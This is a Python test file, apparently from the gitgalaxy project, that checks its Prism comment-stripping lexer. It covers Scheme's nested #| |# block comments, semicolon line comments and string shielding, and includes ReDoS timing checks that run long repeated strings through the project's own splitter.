def test_prism_single_line_delimiter_pattern_redos_immune():
    """
    ReDoS check for the new precompiled pattern: a straightforward literal
    alternation with no nested quantifiers should be trivially linear, but
    verify against an adversarial payload sized the same way as the epic's
    other ReDoS checks rather than assume.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    poison = "x" * 80000 + "#" * 20000
    start = time.time()
    real_prism.split_streams(poison, "python")
    duration = time.time() - start
    assert duration < 2.0, f"line_exclusive delimiter pattern shows non-linear scaling: {duration}s"


# ==============================================================================
# TEST 13: SCHEME'S #| |# BLOCK COMMENTS ACTUALLY NEST (#770)
# ==============================================================================
def test_prism_scheme_lexical_family_reclassified():
    """
    Scheme was previously "line_exclusive" despite its own inline comment
    describing a nested block-comment family that was never wired up
    (#770). Confirms the reclassification landed.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

    assert LANGUAGE_DEFINITIONS["scheme"]["lexical_family"] == "recursive_block_lisp"


def test_prism_scheme_block_comment_regression_from_issue_770():
    """
    Regression test for #770 using the exact multi-line example from the
    issue report. Before the fix, only the opening line of a `#| ... |#`
    block was recognized as a comment (line_exclusive has no cross-line
    state) -- every subsequent line, including a fake commented-out function
    definition, leaked into code_stream as live code.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    code = (
        "(define (foo x)\n"
        "  #| This is a block comment\n"
        "     spanning multiple lines\n"
        "     (define fake-function x) |#\n"
        "  (+ x 1))\n"
    )
    result = real_prism.split_streams(code, "scheme")

    assert "This is a block comment" not in result["code_stream"]
    assert "spanning multiple lines" not in result["code_stream"]
    assert "fake-function" not in result["code_stream"], (
        "commented-out fake function definition leaked into code_stream"
    )
    assert "This is a block comment" in result["comment_stream"]
    assert "spanning multiple lines" in result["comment_stream"]

    assert "(define (foo x)" in result["code_stream"]
    assert "(+ x 1))" in result["code_stream"]


def test_prism_scheme_block_comments_actually_nest():
    """
    Mirrors test_prism_haskell_block_comments_actually_nest: R6RS/R7RS both
    allow #| |# to nest (`#| outer #| inner |# still outer |#`), which is
    exactly why scheme needed the same iterative inside-out peel algorithm
    as recursive_block/recursive_block_haskell rather than a flat delimiter
    match.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams(
        "(define (foo) #| outer #| inner secret |# still outer secret |# (+ 1 1))",
        "scheme",
    )
    assert "outer secret" not in result["code_stream"]
    assert "inner secret" not in result["code_stream"]
    assert "inner secret" in result["comment_stream"]
    assert "outer secret" in result["comment_stream"]
    assert "(define (foo)" in result["code_stream"]
    assert "(+ 1 1))" in result["code_stream"]


def test_prism_scheme_semicolon_line_comments_still_work():
    """
    Scheme's other real-world comment form -- `;` line comments -- must
    still be stripped correctly after moving off line_exclusive onto the
    new dedicated family (recursive_block_lisp reuses the same single-line
    peel step _strip_nested_comments already runs before its block peel).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams('(display "hi") ; a real comment\n(+ 1 1)\n', "scheme")
    assert "a real comment" not in result["code_stream"]
    assert "a real comment" in result["comment_stream"]
    assert '(display "hi")' in result["code_stream"]
    assert "(+ 1 1)" in result["code_stream"]


def test_prism_scheme_string_literal_shielding():
    """
    A string literal containing `#|`, `|#`, or `;` must not be corrupted by
    the new family's block-peel or single-line-peel steps, mirroring the
    existing haskell/powershell string-shielding regression coverage.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams('(display "this ; is not a comment")\n', "scheme")
    assert "this ; is not a comment" in result["code_stream"]


def test_prism_line_exclusive_no_longer_lists_scheme_block_tokens():
    """
    #| and |# were removed from line_exclusive's shared delimiter list
    (gitgalaxy_config.py) now that scheme -- the only language that ever
    needed them -- has its own dedicated family. They were never meaningful
    comment tokens for any of the ~20 other line_exclusive languages, so
    this is a pure config cleanup rather than a behavior change for them
    (each still has plain `#`/`;`/etc. as its own real delimiter, which
    would truncate a line containing `#|`/`|#` regardless -- proving
    absence via live split_streams() isn't meaningful here since e.g.
    python's own bare `#` already truncates such a line on its own).
    """
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    assert "#|" not in LEXICAL_FAMILY_HEURISTICS["lexical_families"]["line_exclusive"]["delimiters"]
    assert "|#" not in LEXICAL_FAMILY_HEURISTICS["lexical_families"]["line_exclusive"]["delimiters"]


def test_prism_recursive_block_lisp_redos_immunity():
    """
    ReDoS check for the new family, matching the discipline used for
    recursive_block_haskell: an adversarial payload with many opening #|
    tokens but no closing |# must resolve in well under the generous
    timeout used throughout this suite, bounded by NESTED_PEEL_LIMIT.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    poison = "#| " * 20000 + "unterminated"
    start = time.time()
    real_prism.split_streams(poison, "scheme")
    duration = time.time() - start
    assert duration < 2.0, f"recursive_block_lisp took {duration:.2f}s on a pathological unterminated payload"
